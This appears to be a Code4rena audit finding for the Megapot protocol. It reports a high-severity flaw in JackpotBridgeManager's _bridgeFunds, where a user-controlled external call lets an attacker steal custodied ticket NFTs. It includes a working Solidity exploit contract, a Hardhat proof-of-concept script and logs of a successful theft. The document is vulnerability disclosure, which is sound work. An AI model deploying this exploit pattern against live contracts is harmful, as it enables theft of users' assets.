---
tags:
  - lang/solidity
  - sector/bridge
  - sector/governance
  - sector/nft
  - sector/stable
  - sector/token
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - novelty/variant
protocol: "[[Megapot]]"
auditors:
  - "[[mrudenko]]"
report: "https://code4rena.com/reports/2025-11-megapot"
genome:
  - "[[broken-logic]]"
  - "[[variant]]"
  - "[[direct-drain]]"
  - "[[account-ownership]]"
  - "[[reentrancy-guard]]"
  - "[[weak-randomness]]"
---
# [H-01] Attacker can steal `JackpotTicketNFT`’s from `JackpotBridgeManager.sol`

- id: 64140
- impact: HIGH
- protocol: [[Megapot]]
- reporter: mrudenko (Code4rena)
- source: https://code4rena.com/reports/2025-11-megapot

## Summary


The `JackpotBridgeManager` contract is used for cross-chain ticket purchases and winnings claims in the Jackpot system. However, there is a vulnerability that allows an attacker to steal NFTs held by the contract. This is due to an unsafe external call pattern in the `_bridgeFunds` function, which allows an attacker to manipulate contract state and steal NFTs. To demonstrate this vulnerability, a Proof of Concept (PoC) has been created where an attacker purchases two tickets and identifies a winning NFT held on behalf of a victim. By crafting a malicious transaction, the attacker can transfer the victim's NFT to their own contract and steal the assets. This vulnerability can be mitigated by validating `RelayTxData` before performing the external call or only allowing external calls to whitelisted addresses. 

## Details



<https://github.com/code-423n4/2025-11-megapot/blob/f0a7297d59c376e38b287b2c56740617dbbfbdc7/contracts/JackpotBridgeManager.sol# L225-L243>

<https://github.com/code-423n4/2025-11-megapot/blob/f0a7297d59c376e38b287b2c56740617dbbfbdc7/contracts/JackpotBridgeManager.sol# L345-L362>

### Finding Description

The `JackpotBridgeManager` contract facilitates cross-chain ticket purchases and winnings claims for the Jackpot system. It acts as a custodian for NFTs representing tickets that are purchased from other chains. However, NFTs held by `JackpotBridgeManager` can be stolen due to an unsafe external call pattern.

Cross-chain users purchase tickets through the `JackpotBridgeManager::buyTickets` function. This function interacts with the `Jackpot` contract to mint tickets (NFTs), which are held in custody by `JackpotBridgeManager`. The contract internally tracks ownership of these NFTs to ensure users from different chains can later claim their winnings.

After the Jackpot draw concludes, users can claim their winnings by calling `JackpotBridgeManager::claimWinnings`. This function retrieves the claimed winnings from the `Jackpot` contract, then bridges the funds to the destination chain via the `_bridgeFunds` function.

The vulnerability arises in the `_bridgeFunds` function:
```

function _bridgeFunds(RelayTxData memory _bridgeDetails, uint256 _claimedAmount) private {
    if (_bridgeDetails.approveTo != address(0)) {
        usdc.approve(_bridgeDetails.approveTo, _claimedAmount);
    }

    uint256 preUSDCBalance = usdc.balanceOf(address(this));
    (bool success,) = _bridgeDetails.to.call(_bridgeDetails.data);

    if (!success) revert BridgeFundsFailed();
    uint256 postUSDCBalance = usdc.balanceOf(address(this));

    if (preUSDCBalance - postUSDCBalance != _claimedAmount) revert NotAllFundsBridged();

    emit FundsBridged(_bridgeDetails.to, _claimedAmount);
}
```

The `_bridgeFunds` function performs an external call to `_bridgeDetails.to`, which is user-controlled. This allows an attacker to craft arbitrary call data that executes malicious logic. By leveraging this external call, an attacker can manipulate contract state and steal NFTs held by `JackpotBridgeManager`.

### Exploitation Scenario

1. The attacker purchases two tickets via `JackpotBridgeManager::buyTickets`.
2. Assume the `JackpotBridgeManager` is already holding multiple NFTs on behalf of legitimate cross-chain users.
3. After the jackpot draw, the attacker has some legitimate winning tickets but identifies a winning NFT held on behalf of a victim.
4. The attacker crafts a malicious `claimWinnings` transaction as follows:

   * `_userTicketIds`: Attacker’s own ticket IDs.
   * `_bridgeDetails`:
   * `approveTo`: Address of an attacker-controlled exploit contract.
   * `to`: Address of the `jackpotNFT` contract.
   * `data`: Encoded call data for `safeTransferFrom(address from, address to, uint256 tokenId, bytes data)`,
     transferring the victim’s NFT from `JackpotBridgeManager` to the exploit contract.

### Attack Flow

1. The attacker calls `claimWinnings`, causing `JackpotBridgeManager` to approve the attacker’s contract for `_claimedAmount`.
2. The `_bridgeFunds` function then executes an external call to the `jackpotNFT` contract using attacker-supplied data.
3. This triggers `safeTransferFrom`, transferring the victim’s NFT to the attacker’s exploit contract.
4. During the transfer, the `onERC721Received` function in the exploit contract executes, which immediately pulls the approved USDC from `JackpotBridgeManager`, ensuring the USDC balance decreases by exactly `_claimedAmount`.
5. As a result, the post-call balance check

   
```

   if (preUSDCBalance - postUSDCBalance != _claimedAmount) revert NotAllFundsBridged();
   
```

   passes successfully, allowing the transaction to complete without reverting.
6. The victim’s NFT is now transferred to the attacker’s contract, resulting in loss of user assets.

### Recommended mitigation steps

Validate `RelayTxData` before performing the external call or perform external call only on whitelisted addresses.

Expand for detailed Proof of Concept

### Proof of Concept

Place this contract inside the `2025-11-megapot/contracts` and name it `Exploit.sol`

`ExploitContract :`
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

contract Exploit is IERC721Receiver {
  address public jackpotBridgeManager;
  address public token;

  constructor(address _jackpotBridgeManager, address _token) {
    jackpotBridgeManager = _jackpotBridgeManager;
    token = _token;
  }

  // Function to receive ERC721 tokens
  function onERC721Received(
    address operator,
    address from,
    uint256 tokenId,
    bytes calldata data
  ) external override returns (bytes4) {
    // Pull ERC20 tokens from jackpotBridgeManager based on allowance
    IERC20 erc20Token = IERC20(token);
    uint256 allowance = erc20Token.allowance(
      jackpotBridgeManager,
      address(this)
    );
    if (allowance > 0) {
      require(
        erc20Token.transferFrom(jackpotBridgeManager, address(this), allowance),
        "Transfer failed"
      );
    }

    // Return the correct selector to confirm ERC721 acceptance
    return IERC721Receiver.onERC721Received.selector;
  }

  // Rescue function for ERC20 tokens
  function rescueERC20(address _token, address _to, uint256 _amount) external {
    require(_to != address(0), "Invalid address");
    IERC20(_token).transfer(_to, _amount);
  }

  // Rescue function for ERC721 tokens
  function rescueERC721(
    address _token,
    address _to,
    uint256 _tokenId
  ) external {
    require(_to != address(0), "Invalid address");
    IERC721(_token).safeTransferFrom(address(this), _to, _tokenId);
  }

  function tokenAddress() external view returns (address) {
    return token;
  }

  // Fallback to receive ETH if needed
  receive() external payable {}

  function safeTransferFrom(
    address from,
    address to,
    uint256 id,
    bytes calldata data
  ) public payable virtual {}
}
```

Paste this in `C4PoC.spec.ts` and run
```

yarn test --grep "demonstrates the C4 submission's validity"
```

`POC :`
```

import { ethers } from "hardhat";
import { getWaffleExpect, getAccounts } from "@utils/test/index";
import { ether, usdc } from "@utils/common";
import { Account } from "@utils/test";

import {
  Jackpot,
  JackpotBridgeManager,
  JackpotTicketNFT,
  ScaledEntropyProviderMock,
  ReentrantUSDCMock,
  GuaranteedMinimumPayoutCalculator,
  JackpotLPManager,
} from "@utils/contracts";

import {
  JackpotSystemFixture,
  RelayTxData,
  Ticket,
} from "@utils/types";

import { deployJackpotSystem } from "@utils/test/jackpotFixture";
import {
  generateClaimWinningsSignature,
} from "@utils/protocolUtils";

import { takeSnapshot, SnapshotRestorer, time } from "@nomicfoundation/hardhat-toolbox/network-helpers";

const expect = getWaffleExpect();

describe.only("PoC", () => {
  let owner: Account;
  let attacker: Account;
  let victim: Account;
  let jackpotSystem: JackpotSystemFixture;
  let jackpot: Jackpot;
  let jackpotNFT: JackpotTicketNFT;
  let jackpotBridgeManager: JackpotBridgeManager;
  let usdcMock: ReentrantUSDCMock;
  let entropyProvider: ScaledEntropyProviderMock;
  let payoutCalculator: GuaranteedMinimumPayoutCalculator;
  let jackpotLPManager: JackpotLPManager;
  let snapshot: SnapshotRestorer;

  beforeEach(async () => {
    // Retrieve necessary test accounts
    [owner, attacker, victim] = await getAccounts();

    // Deploy full Jackpot system fixture
    jackpotSystem = await deployJackpotSystem();
    jackpot = jackpotSystem.jackpot;
    jackpotNFT = jackpotSystem.jackpotNFT;
    jackpotBridgeManager = await jackpotSystem.deployer.deployJackpotBridgeManager(
      await jackpot.getAddress(),
      await jackpotNFT.getAddress(),
      await jackpotSystem.usdcMock.getAddress(),
      "MegapotBridgeManager",
      "1.0.0"
    );
    usdcMock = jackpotSystem.usdcMock;
    entropyProvider = jackpotSystem.entropyProvider;
    payoutCalculator = jackpotSystem.payoutCalculator;
    jackpotLPManager = jackpotSystem.jackpotLPManager;

    // Initialize jackpot and deposit LP funds
    await jackpot.connect(owner.wallet).initialize(
      usdcMock.getAddress(),
      await jackpotLPManager.getAddress(),
      await jackpotNFT.getAddress(),
      entropyProvider.getAddress(),
      await payoutCalculator.getAddress()
    );
    await jackpot.connect(owner.wallet).initializeLPDeposits(usdc(10_000_000));
    await usdcMock.connect(owner.wallet).approve(jackpot.getAddress(), usdc(1_000_000));
    await jackpot.connect(owner.wallet).lpDeposit(usdc(1_000_000));
    await jackpot.connect(owner.wallet).initializeJackpot((await time.latest()) + 60 * 60 * 24); // 24hr drawing window

    // Take blockchain snapshot for easy reset before each test
    snapshot = await takeSnapshot();
  });

  beforeEach(async () => {
    await snapshot.restore();
  });

  it("demonstrates the C4 submission's validity", async () => {
    console.log("Starting Exploit PoC...");

    // Fund attacker with USDC and approve JackpotBridgeManager
    await usdcMock.connect(owner.wallet).transfer(attacker.address, usdc(1_000));
    await usdcMock.connect(attacker.wallet).approve(jackpotBridgeManager.getAddress(), usdc(5));

    // Attacker purchases two ticket NFTs
    const attackerTickets: Ticket[] = [
      { normals: [BigInt(1), BigInt(2), BigInt(3), BigInt(4), BigInt(5)], bonusball: BigInt(1) },
      { normals: [BigInt(6), BigInt(7), BigInt(8), BigInt(9), BigInt(10)], bonusball: BigInt(2) },
    ];
    await jackpotBridgeManager.connect(attacker.wallet).buyTickets(
      attackerTickets,
      attacker.address,
      [], // No referrers for simplicity
      [],
      ethers.encodeBytes32String("attackerSource")
    );

    // Fund victim with USDC and approve JackpotBridgeManager
    await usdcMock.connect(owner.wallet).transfer(victim.address, usdc(1_000));
    await usdcMock.connect(victim.wallet).approve(jackpotBridgeManager.getAddress(), usdc(5));

    // Victim purchases two ticket NFTs
    const victimTickets: Ticket[] = [
      { normals: [BigInt(11), BigInt(12), BigInt(13), BigInt(14), BigInt(15)], bonusball: BigInt(1) },
      { normals: [BigInt(8), BigInt(9), BigInt(10), BigInt(11), BigInt(12)], bonusball: BigInt(2) },
    ];
    await jackpotBridgeManager.connect(victim.wallet).buyTickets(
      victimTickets,
      victim.address,
      [], // No referrers
      [],
      ethers.encodeBytes32String("victimSource")
    );

    // Fast forward to after drawing period
    const drawingState = await jackpot.getDrawingState(1);
    await time.increaseTo(drawingState.drawingTime + BigInt(1));

    // Run jackpot draw and simulate randomness callback
    await jackpot.connect(owner.wallet).runJackpot({ value: ethers.parseEther("1") });
    await entropyProvider.randomnessCallback([
      [BigInt(8), BigInt(9), BigInt(10), BigInt(11), BigInt(12)],
      [BigInt(2)],
    ]);

    console.log("Tickets have been purchased and jackpot drawn.");

    // Retrieve attacker and victim ticket IDs from JackpotBridgeManager
    const attackerTicketIds = await jackpotBridgeManager.getUserTickets(attacker.address, 1);
    const victimTicketIds = await jackpotBridgeManager.getUserTickets(victim.address, 1);

    console.log(`Attacker Ticket IDs: ${attackerTicketIds.map(id => id.toString()).join(", ")}`);
    console.log(`Victim Ticket IDs: ${victimTicketIds.map(id => id.toString()).join(", ")}`);

    // Deploy the malicious Exploit contract controlled by attacker
    const ExploitFactory = await ethers.getContractFactory("Exploit");
    const exploit = await ExploitFactory.deploy(jackpotBridgeManager.getAddress(), usdcMock.getAddress());
    await exploit.waitForDeployment();
    console.log(`Exploit contract deployed at: ${await exploit.getAddress()}`);

    // Check and log who owns victim's NFT before exploit
    const victimNFTOwnerBefore = await jackpotNFT.ownerOf(victimTicketIds[1]);
    console.log(`Victim's NFT (ID: ${victimTicketIds[1].toString()}) owner before exploit: ${victimNFTOwnerBefore}`);
    expect(victimNFTOwnerBefore).to.equal(await jackpotBridgeManager.getAddress());

    // Prepare RelayTxData with malicious safeTransferFrom call targeting victim's NFT
    const maliciousBridgeDetails: RelayTxData = {
      approveTo: await exploit.getAddress(),
      to: await jackpotNFT.getAddress(),
      data: ExploitFactory.interface.encodeFunctionData("safeTransferFrom", [
        await jackpotBridgeManager.getAddress(),
        await exploit.getAddress(),
        victimTicketIds[1], // Victim's NFT token ID
        "0x",
      ]),
    };

let attackersTicketIdsArray: bigint[] = [];
    attackersTicketIdsArray.push(attackerTicketIds[0]);
    attackersTicketIdsArray.push(attackerTicketIds[1]);

// Prepare signature for claimWinnings with attacker ticket IDs and malicious payload
    const claimSignature = await generateClaimWinningsSignature(
      await jackpotBridgeManager.getAddress(),
      attackersTicketIdsArray,
      maliciousBridgeDetails,
      attacker.wallet
    );

    // Attacker executes the malicious claimWinnings call to steal victim's NFT
    await jackpotBridgeManager.connect(attacker.wallet).claimWinnings(
      attackersTicketIdsArray,
      maliciousBridgeDetails,
      claimSignature
    );

    // Check and log the owner of victim's NFT after exploit
    const victimNFTOwnerAfter = await jackpotNFT.ownerOf(victimTicketIds[1]);
    console.log(`Victim's NFT (ID: ${victimTicketIds[1].toString()}) owner after exploit: ${victimNFTOwnerAfter}`);
    expect(victimNFTOwnerAfter).to.equal(await exploit.getAddress());

    console.log("Exploit successful: Victim's NFT has been transferred to attacker-controlled contract.");
  });
});
```

`Logs :`
```

$ hardhat test --grep 'demonstrates the C4 submission'\''s validity'

PoC
Starting Exploit PoC...
Tickets have been purchased and jackpot drawn.
Attacker Ticket IDs: 30083767223809672004471377353616219992240262417604370218993016052021235661798, 38671522753779678852729165039051710713305298646011436960524446838460091584105
Victim Ticket IDs: 97081606848453597251411855136975184935661802060911520663759427091658643779747, 104813746921659704743262162214761331873120870227460325112138655077773912896606
Exploit contract deployed at: 0x3Aa5ebB10DC797CAC828524e59A333d0A371443c
Victim's NFT (ID: 104813746921659704743262162214761331873120870227460325112138655077773912896606) owner before exploit: 0x8A791620dd6260079BF849Dc5567aDC3F2FdC318
Victim's NFT (ID: 104813746921659704743262162214761331873120870227460325112138655077773912896606) owner after exploit: 0x3Aa5ebB10DC797CAC828524e59A333d0A371443c
Exploit successful: Victim's NFT has been transferred to attacker-controlled contract.
    ✔ demonstrates the C4 submission's validity (345ms)

1 passing (471ms)
```

---
